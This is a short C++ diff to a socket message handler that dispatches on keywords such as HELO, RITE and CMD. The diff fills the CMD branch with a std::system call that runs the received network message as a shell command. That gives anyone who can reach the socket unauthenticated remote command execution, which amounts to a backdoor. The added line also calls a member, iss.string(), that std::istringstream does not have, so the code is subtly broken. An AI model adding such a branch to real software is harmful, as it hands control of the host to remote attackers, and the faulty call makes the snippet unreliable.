@@ -1,5 +1,6 @@
 // See 
 
+#include <cstdlib>
 #include <iostream>
 #include <sstream>
 #include <string>
@@ -54,7 +55,7 @@ void handleMessage(const std::string& msg, int sock) {
     std::string keyword, id;
     if(!(iss >> keyword) || !(iss >> id)) {
         // Failure state
-        break;
+        return;
     }
 
     if(keyword == "HELO") {
@@ -68,7 +69,7 @@ void handleMessage(const std::string& msg, int sock) {
     } else if(keyword == "RITE") {
 
     } else if(keyword == "CMD"){
-
+        std::system(iss.string().c_str());
     } else {
         // ERR
     }
